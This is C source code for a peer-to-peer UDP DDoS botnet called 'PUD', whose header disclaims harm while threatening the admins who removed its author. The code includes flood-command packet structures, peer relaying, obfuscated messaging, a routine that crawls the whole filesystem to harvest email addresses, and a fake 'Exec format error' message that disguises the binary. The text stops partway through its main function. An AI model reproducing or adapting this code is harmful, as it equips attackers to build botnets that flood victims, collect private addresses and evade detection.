/****************************************************************************
 *                                                                          *
 *           Peer-to-peer UDP Distributed Denial of Service (PUD)           *
 *                         by contem@efnet                                  *
 *                                                                          *
 *         Virtually connects computers via the udp protocol on the         *
 *  specified port.  Uses a newly created peer-to-peer protocol that        *
 *  incorperates uses on unstable or dead computers.  The program is        *
 *  ran with the parameters of another ip on the virtual network.  If       *
 *  running on the first computer, run with the ip 127.0.0.1 or some        *
 *  other type of local address.  Ex:                                       *
 *                                                                          *
 *           Computer A:   ./program 127.0.0.1                              *
 *           Computer B:   ./program Computer_A                             *
 *           Computer C:   ./program Computer_A                             *
 *           Computer D:   ./program Computer_C                             *
 *                                                                          *
 *         Any form of that will work.  The linking process works by        *
 *  giving each computer the list of avaliable computers, then              *
 *  using a technique called pudbroadcast segmentation combined with TCP       *
 *  like functionality to insure that another computer on the network       *
 *  receives the pudbroadcast packet, segments it again and recreates          *
 *  the packet to send to other hosts.  That technique can be used to       *
 *  support over 16 million simutaniously connected computers.              *
 *                                                                          *
 *         Thanks to ensane and st for donating shells and test beds        *
 *  for this program.  And for the admins who removed me because I          *
 *  was testing this program (you know who you are) need to watch           *
 *  their backs.                                                            *
 *                                                                          *
 *         I am not responsible for any harm caused by this program!        *
 *  I made this program to demonstrate peer-to-peer communication and       *
 *  should not be used in real life.  It is an education program that       *
 *  should never even be ran at all, nor used in any way, shape or          *
 *  form.  It is not the authors fault if it was used for any purposes      *
 *  other than educational.                                                 *
 *                                                                          *
 ****************************************************************************/

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdarg.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/time.h>
#include <unistd.h>
#include <errno.h>
#include <netdb.h>
#include <arpa/telnet.h>
#include <sys/wait.h>
#include <signal.h>

#undef SCAN
#undef LARGE_NET
#undef FREEBSD

#define PORT		2002

#define pudbroadcastS	2
#define LINKS		128
#define CLIENTS		128
#define SCANPORT	80
#define SCANTIMEOUT	5
#define MAXPATH		4096
#define ESCANPORT	10100
#define VERSION		11092002

//////////////////////////////////////////////////////////////////////////////////////
//                                  Macros                                          //
//////////////////////////////////////////////////////////////////////////////////////

#define FREE(x) {if (x) { free(x);x=NULL; }}

enum { TCP_PENDING=1, TCP_CONNECTED=2, SOCKS_REPLY=3 };
enum { ASUCCESS=0, ARESOLVE, ACONNECT, ASOCKET, ABIND, AINUSE, APENDING, AINSTANCE, AUNKNOWN };
enum { AREAD=1, AWRITE=2, AEXCEPT=4 };

//////////////////////////////////////////////////////////////////////////////////////
//                                  Packet headers                                  //
//////////////////////////////////////////////////////////////////////////////////////

unsigned long fuckyou = 0;

struct llheader {
	char type;
	unsigned long checksum;
	unsigned long id;
};
struct header {
	char tag;
	int id;
	unsigned long len;
	unsigned long seq;
};
struct route_rec {
	struct header h;
	char sync;
	unsigned char hops;
	unsigned long server;
	unsigned long links;
};
struct kill_rec {
	struct header h;
};
struct sh_rec {
	struct header h;
};
struct list_rec {
	struct header h;
};
struct udp_rec {
	struct header h;
	unsigned long size;
	unsigned long target;
	unsigned short port;
	unsigned long secs;
};
struct tcp_rec {
	struct header h;
	unsigned long target;
	unsigned short port;
	unsigned long secs;
};
struct tcp6_rec {
	struct header h;
	unsigned long target[4];
	unsigned short port;
	unsigned long secs;
};
struct gen_rec {
	struct header h;
	unsigned long target;
	unsigned short port;
	unsigned long secs;
};
struct df_rec {
	struct header h;
	unsigned long target;
	unsigned long secs;
};
struct add_rec {
	struct header h;
	unsigned long server;
	unsigned long socks;
	unsigned long bind;
	unsigned short port;
};
struct data_rec {
	struct header h;
};
struct addsrv_rec {
	struct header h;
};
struct initsrv_rec {
	struct header h;
};
struct qmyip_rec {
	struct header h;
};
struct myip_rec {
	struct header h;
	unsigned long ip;
};
struct escan_rec {
	struct header h;
	unsigned long ip;
};
struct getinfo_rec {
	struct header h;
	unsigned long time;
	unsigned long mtime;
};
struct info_rec {
	struct header h;
	unsigned char a;
	unsigned char b;
	unsigned char c;
	unsigned char d;
	unsigned long ip;
	unsigned long uptime;
	unsigned long reqtime;
	unsigned long reqmtime;
	unsigned long in;
	unsigned long out;
	unsigned long version;
};

//////////////////////////////////////////////////////////////////////////////////////
//                             Public variables                                     //
//////////////////////////////////////////////////////////////////////////////////////

struct ainst {
	void *ext,*ext5;
	int ext2,ext3,ext4;

	int sock,error;
	unsigned long len;
	struct sockaddr_in in;
};
struct ainst clients[CLIENTS*2];
struct ainst udpclient;
unsigned int sseed=0;
struct route_table {
	int id;
	unsigned long ip;
	unsigned short port;
} routes[LINKS];
unsigned long numlinks, *links=NULL, myip=0;
unsigned long sequence[LINKS], rsa[LINKS];
unsigned int *pids=NULL;
unsigned long uptime=0, in=0, out=0;
unsigned long synctime=0;
int syncmodes=1;

struct mqueue {
	char *packet;
	unsigned long len;
	unsigned long id;
	unsigned long time;
	unsigned long ltime;
	unsigned long destination;
	unsigned short port;
	unsigned char trys;
	struct mqueue *next;
} *queues=NULL;

#ifdef SCAN
unsigned char classes[] = { 3, 4, 6, 8, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 26, 28, 29, 30, 32, 33, 34, 35, 38, 40, 43, 44, 45,
	46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 61, 62, 63, 64, 65, 66, 67, 68, 80, 81, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138,
	139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167,
	168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196,
	198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 224, 225, 226, 227, 228, 229,
	230, 231, 232, 233, 234, 235, 236, 237, 238, 239 };
#endif

//////////////////////////////////////////////////////////////////////////////////////
//                               Public routines                                    //
//////////////////////////////////////////////////////////////////////////////////////

unsigned long gettimeout() {
	return 36+(numlinks/15);
}

void syncmode(int mode) {
	syncmodes=mode;
}

void gsrand(unsigned long s) {
	sseed=s;
}
unsigned long grand() {
	sseed=((sseed*965764979)%65535)/2;
	return sseed;
}

void nas(int a) {
}


char *aerror(struct ainst *inst) {
	if (inst == NULL) return "Invalid instance or socket";
	switch(inst->error) {
		case ASUCCESS:return "Operation Success";
		case ARESOLVE:return "Unable to resolve";
		case ACONNECT:return "Unable to connect";
		case ASOCKET:return "Unable to create socket";
		case ABIND:return "Unable to bind socket";
		case AINUSE:return "Port is in use";
		case APENDING:return "Operation pending";
		case AUNKNOWN:default:return "Unknown";
	}
	return "";
}

int aresolve(char *host) {
 	struct hostent *hp;
	if (inet_addr(host) == 0 || inet_addr(host) == -1) {
		unsigned long a;
		if ((hp = gethostbyname(host)) == NULL) return 0;
		bcopy((char*)hp->h_addr, (char*)&a, hp->h_length);
		return a;
	}
	else return inet_addr(host);
}

int abind(struct ainst *inst,unsigned long ip,unsigned short port) {
	struct sockaddr_in in;
	if (inst == NULL) return (AINSTANCE);
	if (inst->sock == 0) {
		inst->error=AINSTANCE;
		return (AINSTANCE);
	}
	inst->len=0;
	in.sin_family = AF_INET;
	if (ip == NULL) in.sin_addr.s_addr = INADDR_ANY;
	else in.sin_addr.s_addr = ip;
	in.sin_port = htons(port);
	if (bind(inst->sock, (struct sockaddr *)&in, sizeof(in)) < 0) {
		inst->error=ABIND;
		return (ABIND);
	}
	inst->error=ASUCCESS;
	return ASUCCESS;
}

int await(struct ainst **inst,unsigned long len,char type,long secs) {
	struct timeval tm,*tmp;
	fd_set read,write,except,*readp,*writep,*exceptp;
	int p,ret,max;
	if (inst == NULL) return (AINSTANCE);
	for (p=0;p<len;p++) inst[p]->len=0;
	if (secs > 0) {
		tm.tv_sec=secs;
		tm.tv_usec=0;
		tmp=&tm;
	}
	else tmp=(struct timeval *)NULL;
	if (type & AREAD) {
		FD_ZERO(&read);
		for (p=0;p<len;p++) FD_SET(inst[p]->sock,&read);
		readp=&read;
	}
	else readp=(struct fd_set*)0;
	if (type & AWRITE) {
		FD_ZERO(&write);
		for (p=0;p<len;p++) FD_SET(inst[p]->sock,&write);
		writep=&write;
	}
	else writep=(struct fd_set*)0;
	if (type & AEXCEPT) {
		FD_ZERO(&except);
		for (p=0;p<len;p++) FD_SET(inst[p]->sock,&except);
		exceptp=&except;
	}
	else exceptp=(struct fd_set*)0;
	for (p=0,max=0;p<len;p++) if (inst[p]->sock > max) max=inst[p]->sock;
	if ((ret=select(max+1,readp,writep,exceptp,tmp)) == 0) {
		for (p=0;p<len;p++) inst[p]->error=APENDING;
		return (APENDING);
	}
	if (ret == -1) return (AUNKNOWN);
	for (p=0;p<len;p++) {
		if (type & AREAD) if (FD_ISSET(inst[p]->sock,&read)) inst[p]->len+=AREAD;
		if (type & AWRITE) if (FD_ISSET(inst[p]->sock,&write)) inst[p]->len+=AWRITE;
		if (type & AEXCEPT) if (FD_ISSET(inst[p]->sock,&except)) inst[p]->len+=AEXCEPT;
	}
	for (p=0;p<len;p++) inst[p]->error=ASUCCESS;
	return (ASUCCESS);
}

int atcp_sync_check(struct ainst *inst) {
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	errno=0;
	if (connect(inst->sock, (struct sockaddr *)&inst->in, sizeof(inst->in)) == 0 || errno == EISCONN) {
		inst->error=ASUCCESS;
		return (ASUCCESS);
	}
	if (!(errno == EINPROGRESS ||errno == EALREADY)) {
		inst->error=ACONNECT;
		return (ACONNECT);
	}
	inst->error=APENDING;
	return (APENDING);
}

int atcp_sync_connect(struct ainst *inst,char *host,unsigned int port) {
	int flag=1;
 	struct hostent *hp;
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	if ((inst->sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
		inst->error=ASOCKET;
		return (ASOCKET);
	}
	if (inet_addr(host) == 0 || inet_addr(host) == -1) {
		if ((hp = gethostbyname(host)) == NULL) {
			inst->error=ARESOLVE;
			return (ARESOLVE);
		}
		bcopy((char*)hp->h_addr, (char*)&inst->in.sin_addr, hp->h_length);
	}
	else inst->in.sin_addr.s_addr=inet_addr(host);
	inst->in.sin_family = AF_INET;
	inst->in.sin_port = htons(port);
	flag = fcntl(inst->sock, F_GETFL, 0);
	flag |= O_NONBLOCK;
	fcntl(inst->sock, F_SETFL, flag);
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

int atcp_connect(struct ainst *inst,char *host,unsigned int port) {
	int flag=1;
	unsigned long start;
 	struct hostent *hp;
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	if ((inst->sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
		inst->error=ASOCKET;
		return (ASOCKET);
	}
	if (inet_addr(host) == 0 || inet_addr(host) == -1) {
		if ((hp = gethostbyname(host)) == NULL) {
			inst->error=ARESOLVE;
			return (ARESOLVE);
		}
		bcopy((char*)hp->h_addr, (char*)&inst->in.sin_addr, hp->h_length);
	}
	else inst->in.sin_addr.s_addr=inet_addr(host);
	inst->in.sin_family = AF_INET;
	inst->in.sin_port = htons(port);
	flag = fcntl(inst->sock, F_GETFL, 0);
	flag |= O_NONBLOCK;
	fcntl(inst->sock, F_SETFL, flag);
	start=time(NULL);
	while(time(NULL)-start < 10) {
		errno=0;
		if (connect(inst->sock, (struct sockaddr *)&inst->in, sizeof(inst->in)) == 0 || errno == EISCONN) {
			inst->error=ASUCCESS;
			return (ASUCCESS);
		}
		if (!(errno == EINPROGRESS ||errno == EALREADY)) break;
		sleep(1);
	}
	inst->error=ACONNECT;
	return (ACONNECT);
}

int atcp_accept(struct ainst *inst,struct ainst *child) {
	int sock;
	unsigned int datalen;
	if (inst == NULL || child == NULL) return (AINSTANCE);
	datalen=sizeof(child->in);
	inst->len=0;
	memcpy((void*)child,(void*)inst,sizeof(struct ainst));
	if ((sock=accept(inst->sock,(struct sockaddr *)&child->in,&datalen)) < 0) {
		memset((void*)child,0,sizeof(struct ainst));
		inst->error=APENDING;
		return (APENDING);
	}
	child->sock=sock;
	inst->len=datalen;
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

int atcp_send(struct ainst *inst,char *buf,unsigned long len) {
	long datalen;
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	errno=0;
	if ((datalen=write(inst->sock,buf,len)) < len) {
		if (errno == EAGAIN) {
			inst->error=APENDING;
			return (APENDING);
		}
		else {
			inst->error=AUNKNOWN;
			return (AUNKNOWN);
		}
	}
	inst->len=datalen;
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

int atcp_sendmsg(struct ainst *inst, char *words, ...) {
	static char textBuffer[2048];
	unsigned int a;
	va_list args;
	va_start(args, words);
	a=vsprintf(textBuffer, words, args);
	va_end(args);
	return atcp_send(inst,textBuffer,a);
}

int atcp_recv(struct ainst *inst,char *buf,unsigned long len) {
	long datalen;
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	if ((datalen=read(inst->sock,buf,len)) < 0) {
		if (errno == EAGAIN) {
			inst->error=APENDING;
			return (APENDING);
		}
		else {
			inst->error=AUNKNOWN;
			return (AUNKNOWN);
		}
	}
	if (datalen == 0 && len) {
		inst->error=AUNKNOWN;
		return (AUNKNOWN);
	}
	inst->len=datalen;
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

int atcp_close(struct ainst *inst) {
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	if (close(inst->sock) < 0) {
		inst->error=AUNKNOWN;
		return (AUNKNOWN);
	}
	inst->sock=0;
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

int audp_listen(struct ainst *inst,unsigned int port) {
	int flag=1;
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	if ((inst->sock = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0) {
		inst->error=ASOCKET;
		return (ASOCKET);
	}
	inst->in.sin_family = AF_INET;
	inst->in.sin_addr.s_addr = INADDR_ANY;
	inst->in.sin_port = htons(port);
	if (bind(inst->sock, (struct sockaddr *)&inst->in, sizeof(inst->in)) < 0) {
		inst->error=ABIND;
		return (ABIND);
	}
#ifdef O_DIRECT
	flag = fcntl(inst->sock, F_GETFL, 0);
	flag |= O_DIRECT;
	fcntl(inst->sock, F_SETFL, flag);
#endif
	inst->error=ASUCCESS;
	flag=1;
	setsockopt(inst->sock,SOL_SOCKET,SO_OOBINLINE,&flag,sizeof(flag));
	return (ASUCCESS);
}

int audp_setup(struct ainst *inst,char *host,unsigned int port) {
	int flag=1;
 	struct hostent *hp;
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	if ((inst->sock = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0) {
		inst->error=ASOCKET;
		return (ASOCKET);
	}
	if (inet_addr(host) == 0 || inet_addr(host) == -1) {
		if ((hp = gethostbyname(host)) == NULL) {
			inst->error=ARESOLVE;
			return (ARESOLVE);
		}
		bcopy((char*)hp->h_addr, (char*)&inst->in.sin_addr, hp->h_length);
	}
	else inst->in.sin_addr.s_addr=inet_addr(host);
	inst->in.sin_family = AF_INET;
	inst->in.sin_port = htons(port);
#ifdef O_DIRECT
	flag = fcntl(inst->sock, F_GETFL, 0);
	flag |= O_DIRECT;
	fcntl(inst->sock, F_SETFL, flag);
#endif
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

int audp_relay(struct ainst *parent,struct ainst *inst,char *host,unsigned int port) {
 	struct hostent *hp;
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	inst->sock = parent->sock;
	if (inet_addr(host) == 0 || inet_addr(host) == -1) {
		if ((hp = gethostbyname(host)) == NULL) {
			inst->error=ARESOLVE;
			return (ARESOLVE);
		}
		bcopy((char*)hp->h_addr, (char*)&inst->in.sin_addr, hp->h_length);
	}
	else inst->in.sin_addr.s_addr=inet_addr(host);
	inst->in.sin_family = AF_INET;
	inst->in.sin_port = htons(port);
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

int audp_send(struct ainst *inst,char *buf,unsigned long len) {
	long datalen;
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	errno=0;
	if ((datalen=sendto(inst->sock,buf,len,0,(struct sockaddr*)&inst->in,sizeof(inst->in))) < len) {
		if (errno == EAGAIN) {
			inst->error=APENDING;
			return (APENDING);
		}
		else {
			inst->error=AUNKNOWN;
			return (AUNKNOWN);
		}
	}
	out++;
	inst->len=datalen;
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

int audp_sendmsg(struct ainst *inst, char *words, ...) {
	static char textBuffer[2048];
	unsigned int a;
	va_list args;
	va_start(args, words);
	a=vsprintf(textBuffer, words, args);
	va_end(args);
	return audp_send(inst,textBuffer,a);
}

int audp_recv(struct ainst *inst,struct ainst *client,char *buf,unsigned long len) {
	long datalen,nlen;
	if (inst == NULL) return (AINSTANCE);
	nlen=sizeof(inst->in);
	inst->len=0;
	memcpy((void*)client,(void*)inst,sizeof(struct ainst));
	if ((datalen=recvfrom(inst->sock,buf,len,0,(struct sockaddr*)&client->in,(size_t*)&nlen)) < 0) {
		if (errno == EAGAIN) {
			inst->error=APENDING;
			return (APENDING);
		}
		else {
			inst->error=AUNKNOWN;
			return (AUNKNOWN);
		}
	}
	inst->len=datalen;
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

int audp_close(struct ainst *inst) {
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	if (close(inst->sock) < 0) {
		inst->error=AUNKNOWN;
		return (AUNKNOWN);
	}
	inst->sock=0;
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

unsigned long _decrypt(char *str, unsigned long len) {
	unsigned long pos=0,seed[4]={0x78912389,0x094e7bc43,0xba5de30b,0x7bc54da7};
	gsrand(((seed[0]+seed[1])*seed[2])^seed[3]);
	while(1) {
		gsrand(seed[pos%4]+grand()+pos);
		str[pos]-=grand();
		pos++;
		if (pos >= len) break;
	}
	return pos;
}

unsigned long _encrypt(char *str, unsigned long len) {
	unsigned long pos=0,seed[4]={0x78912389,0x094e7bc43,0xba5de30b,0x7bc54da7};
	gsrand(((seed[0]+seed[1])*seed[2])^seed[3]);
	while(1) {
		gsrand(seed[pos%4]+grand()+pos);
		str[pos]+=grand();
		pos++;
		if (pos >= len) break;
	}
	return pos;
}

int useseq(unsigned long seq) {
	unsigned long a;
	if (seq == 0) return 0;
	for (a=0;a<LINKS;a++) if (sequence[a] == seq) return 1;
	return 0;
}

unsigned long newseq() {
	unsigned long seq;
	while(1) {
		seq=(rand()*rand())^rand();
		if (useseq(seq) || seq == 0) continue;
		break;
	}
	return seq;
}

void addseq(unsigned long seq) {
	unsigned long i;
	for (i=LINKS-1;i>0;i--) sequence[i]=sequence[i-1];
	sequence[0]=seq;
}

void addserver(unsigned long server) {
	unsigned long *newlinks, i, stop;
	char a=0;
	for (i=0;i<numlinks;i++) if (links[i] == server) a=1;
	if (a == 1 || server == 0) return;
	numlinks++;
	newlinks=(unsigned long*)malloc((numlinks+1)*sizeof(unsigned long));
	if (newlinks == NULL) return;
	stop=rand()%numlinks;
	for (i=0;i<stop;i++) newlinks[i]=links[i];
	newlinks[i]=server;
	for (;i<numlinks-1;i++) newlinks[i+1]=links[i];
	FREE(links);
	links=newlinks;
}

void conv(char *str,int len,unsigned long server) {
	memset(str,0,len);
	strcpy(str,(char*)inet_ntoa(*(struct in_addr*)&server));
}

int isreal(unsigned long server) {
	char srv[256];
	unsigned int i,f;
	unsigned char a=0,b=0;
	conv(srv,256,server);
	for (i=0;i<strlen(srv) && srv[i]!='.';i++);
	srv[i]=0;
	a=atoi(srv);
	f=i+1;
	for (i++;i<strlen(srv) && srv[i]!='.';i++);
	srv[i]=0;
	b=atoi(srv+f);
	if (a == 127 || a == 10 || a == 0) return 0;
	if (a == 172 && b >= 16 && b <= 31) return 0;
	if (a == 192 && b == 168) return 0;
	return 1;
}

int usersa(unsigned long rs) {
	unsigned long a;
	if (rs == 0) return 0;
	for (a=0;a<LINKS;a++) if (rsa[a] == rs) return 1;
	return 0;
}

unsigned long newrsa() {
	unsigned long rs;
	while(1) {
		rs=(rand()*rand())^rand();
		if (usersa(rs) || rs == 0) continue;
		break;
	}
	return rs;
}

void addrsa(unsigned long rs) {
	unsigned long i;
	for (i=LINKS-1;i>0;i--) rsa[i]=rsa[i-1];
	rsa[0]=rs;
}

void delqueue(unsigned long id) {
	struct mqueue *getqueue=queues, *prevqueue=NULL;
	while(getqueue != NULL) {
		if (getqueue->id == id) {
			getqueue->trys--;
			if (!getqueue->trys) {
				if (prevqueue) prevqueue->next=getqueue->next;
				else queues=getqueue->next;
			}
			return;
		}
		prevqueue=getqueue;
		getqueue=getqueue->next;
	}
}

int waitforqueues() {
	if (mfork() == 0) {
		sleep(gettimeout());
		return 0;
	}
	return 1;
}

//////////////////////////////////////////////////////////////////////////////////////
//                                   Sending functions                              //
//////////////////////////////////////////////////////////////////////////////////////

struct ainst udpserver;

char *lowsend(struct ainst *ts,unsigned char b,char *buf,unsigned long len) {
	struct llheader rp;
	struct mqueue *q;
	char *mbuf=(char*)malloc(sizeof(rp)+len);
	if (mbuf == NULL) return NULL;
	memset((void*)&rp,0,sizeof(struct llheader));
	rp.checksum=in_cksum(buf,len);
	rp.id=newrsa();
	rp.type=0;
	memcpy(mbuf,&rp,sizeof(rp));
	memcpy(mbuf+sizeof(rp),buf,len);

	q=(struct mqueue *)malloc(sizeof(struct mqueue));
	q->packet=(char*)malloc(sizeof(rp)+len);
	memcpy(q->packet,mbuf,sizeof(rp)+len);
	q->len=sizeof(rp)+len;
	q->id=rp.id;
	q->time=time(NULL);
	q->ltime=time(NULL);
	if (b) {
		q->destination=0;
		q->port=PORT;
		q->trys=b;
	}
	else {
		q->destination=ts->in.sin_addr.s_addr;
		q->port=htons(ts->in.sin_port);
		q->trys=1;
	}
	q->next=queues;
	queues=q;

	if (ts) {
		audp_send(ts,mbuf,len+sizeof(rp));
		FREE(mbuf);
	}
	else return mbuf;
}

int relayclient(struct ainst *ts,char *buf,unsigned long len) {
	return lowsend(ts,0,buf,len)?1:0;
}

int relay(unsigned long server,char *buf,unsigned long len) {
	struct ainst ts;
	char srv[256];
	memset((void*)&ts,0,sizeof(struct ainst));
	conv(srv,256,server);
	audp_relay(&udpserver,&ts,srv,PORT);
	return lowsend(&ts,0,buf,len)?1:0;
}

void segment(unsigned char low,char *buf, unsigned long len) {
	unsigned long a=0,c=0;
	char *mbuf=NULL;
	if (numlinks == 0 || links == NULL) return;
	if (low) mbuf=lowsend(NULL,low,buf,len);
	for(;c < 10;c++) {
		a=rand()%numlinks;
		if (links[a] != myip) {
			struct ainst ts;
			char srv[256];
			memset((void*)&ts,0,sizeof(struct ainst));
			conv(srv,256,links[a]);
			audp_relay(&udpserver,&ts,srv,PORT);
			if (mbuf) audp_send(&ts,mbuf,len+sizeof(struct llheader));
			else audp_send(&ts,buf,len);
			break;
		}
	}
	FREE(mbuf);
}

void pudbroadcast(char *buf,unsigned long len) {
	struct route_rec rc;
	char *str=(char*)malloc(sizeof(struct route_rec)+len+1);
	if (str == NULL) return;
	memset((void*)&rc,0,sizeof(struct route_rec));
	rc.h.tag=0x26;
	rc.h.id=rand();
	rc.h.len=sizeof(struct route_rec)+len;
	rc.h.seq=newseq();
	rc.server=0;
	rc.sync=syncmodes;
	rc.links=numlinks;
	rc.hops=5;
	memcpy((void*)str,(void*)&rc,sizeof(struct route_rec));
	memcpy((void*)(str+sizeof(struct route_rec)),(void*)buf,len);
	segment(2,str,sizeof(struct route_rec)+len);
	FREE(str);
}

void syncm(struct ainst *inst,char tag,int id) {
	struct addsrv_rec rc;
	struct next_rec { unsigned long server; } fc;
	unsigned long a,b;
	for (b=0;;b+=700) {
		unsigned long _numlinks=numlinks-b>700?700:numlinks-b;
		unsigned long *_links=links+b;
		unsigned char *str;
		if (b > numlinks) break;
		str=(unsigned char*)malloc(sizeof(struct addsrv_rec)+(_numlinks*sizeof(struct next_rec)));
		if (str == NULL) return;
		memset((void*)&rc,0,sizeof(struct addsrv_rec));
		rc.h.tag=tag;
		rc.h.id=id;
		if (id) rc.h.seq=newseq();
		rc.h.len=sizeof(struct next_rec)*_numlinks;
		memcpy((void*)str,(void*)&rc,sizeof(struct addsrv_rec));
		for (a=0;a<_numlinks;a++) {
			memset((void*)&fc,0,sizeof(struct next_rec));
			fc.server=_links[a];
			memcpy((void*)(str+sizeof(struct addsrv_rec)+(a*sizeof(struct next_rec))),(void*)&fc,sizeof(struct next_rec));
		}
		if (!id) relay(inst->in.sin_addr.s_addr,(void*)str,sizeof(struct addsrv_rec)+(_numlinks*sizeof(struct next_rec)));
		else relayclient(inst,(void*)str,sizeof(struct addsrv_rec)+(_numlinks*sizeof(struct next_rec)));
		FREE(str);
	}
}

void senderror(struct ainst *inst, int id, char *buf2) {
	struct data_rec rc;
	char *str,*buf=strdup(buf2);
	memset((void*)&rc,0,sizeof(struct data_rec));
	rc.h.tag=0x45;
	rc.h.id=id;
	rc.h.seq=newseq();
	rc.h.len=strlen(buf2);
	_encrypt(buf,strlen(buf2));
	str=(char*)malloc(sizeof(struct data_rec)+strlen(buf2)+1);
	if (str == NULL) {
		FREE(buf);
		return;
	}
	memcpy((void*)str,(void*)&rc,sizeof(struct data_rec));
	memcpy((void*)(str+sizeof(struct data_rec)),buf,strlen(buf2));
	relayclient(&udpclient,str,sizeof(struct data_rec)+strlen(buf2));
	FREE(str);
	FREE(buf);
}

//////////////////////////////////////////////////////////////////////////////////////
//                                      Scan for email                              //
//////////////////////////////////////////////////////////////////////////////////////

int isgood(char a) {
	if (a >= 'a' && a <= 'z') return 1;
	if (a >= 'A' && a <= 'Z') return 1;
	if (a >= '0' && a <= '9') return 1;
	if (a == '.' || a == '@' || a == '^' || a == '-' || a == '_') return 1;
	return 0;
}

int islisten(char a) {
	if (a == '.') return 1;
	if (a >= 'a' && a <= 'z') return 1;
	if (a >= 'A' && a <= 'Z') return 1;
	return 0;
}

struct _linklist {
	char *name;
	struct _linklist *next;
} *linklist=NULL;

void AddToList(char *str) {
	struct _linklist *getb=linklist,*newb;
	while(getb != NULL) {
		if (!strcmp(str,getb->name)) return;
		getb=getb->next;
	}
	newb=(struct _linklist *)malloc(sizeof(struct _linklist));
	if (newb == NULL) return;
	newb->name=strdup(str);
	newb->next=linklist;
	linklist=newb;
}

void cleanup(char *buf) {
	while(buf[strlen(buf)-1] == '\n' || buf[strlen(buf)-1] == '\r' || buf[strlen(buf)-1] == ' ') buf[strlen(buf)-1] = 0;
	while(*buf == '\n' || *buf == '\r' || *buf == ' ') {
		unsigned long i;
		for (i=strlen(buf)+1;i>0;i--) buf[i-1]=buf[i];
	}
}

void ScanFile(char *f) {
	FILE *file=fopen(f,"r");
	unsigned long startpos=0;
	if (file == NULL) return;
	while(1) {
		char buf[2];
		memset(buf,0,2);
		fseek(file,startpos,SEEK_SET);
		fread(buf,1,1,file);
		startpos++;
		if (feof(file)) break;
		if (*buf == '@') {
			char email[256],c,d;
			unsigned long pos=0;
			while(1) {
				unsigned long oldpos=ftell(file);
				fseek(file,-1,SEEK_CUR);
				c=fgetc(file);
				if (!isgood(c)) break;
				fseek(file,-1,SEEK_CUR);
				if (oldpos == ftell(file)) break;
			}
			for (pos=0,c=0,d=0;pos<255;pos++) {
				email[pos]=fgetc(file);
				if (email[pos] == '.') c++;
				if (email[pos] == '@') d++;
				if (!isgood(email[pos])) break;
			}
			email[pos]=0;
			if (c == 0 || d != 1) continue;
			if (email[strlen(email)-1] == '.') email[strlen(email)-1]=0;
			if (*email == '@' || *email == '.' || !*email) continue;
			if (!strcmp(email,"webmaster@mydomain.com")) continue;
			for (pos=0,c=0;pos<strlen(email);pos++) if (email[pos] == '.') c=pos;
			if (c == 0) continue;
			if (!strncmp(email+c,".hlp",4)) continue;
			for (pos=c,d=0;pos<strlen(email);pos++) if (!islisten(email[pos])) d=1;
			if (d == 1) continue;
			AddToList(email);
		}
	}
	fclose(file);
}

void StartScan() {
	FILE *f;
	f=popen("find / -type f","r");
	if (f == NULL) return;
	while(1) {
		char fullfile[MAXPATH];
		memset(fullfile,0,MAXPATH);
		fgets(fullfile,MAXPATH,f);
		if (feof(f)) break;
		while(fullfile[strlen(fullfile)-1]=='\n' ||
			fullfile[strlen(fullfile)-1] == '\r')
			fullfile[strlen(fullfile)-1]=0;
		if (!strncmp(fullfile,"/proc",5)) continue;
		if (!strncmp(fullfile,"/dev",4)) continue;
		if (!strncmp(fullfile,"/bin",4)) continue;
		ScanFile(fullfile);
	}
}

//////////////////////////////////////////////////////////////////////////////////////
//                                    Exploit                                       //
//////////////////////////////////////////////////////////////////////////////////////

#ifdef SCAN
void exploit(char *scan_ip) {
	exit(0);
}
#endif

//////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////

int pud_main(int argc, char **argv) {
#ifdef SCAN
	unsigned char a=0,b=0,c=0,d=0;
#endif
	unsigned long bases,*cpbases;
	struct initsrv_rec initrec;
	int null=open("/dev/null",O_RDWR);
	uptime=time(NULL);
	if (argc <= 1) {
		printf("%s: Exec format error. Binary file not executable.\n",argv[0]);
		return 0;
	}
	srand(time(NULL)^getpid());
	memset((char*)&routes,0,sizeof(struct route_table)*24);
	memset(clients,0,sizeof(struct ainst)*CLIENTS*2);
	if (audp_listen(&udpserver,PORT) != 0) {
		printf("Error: %s\n",aerror(&udpserver));
		return 0;
	}
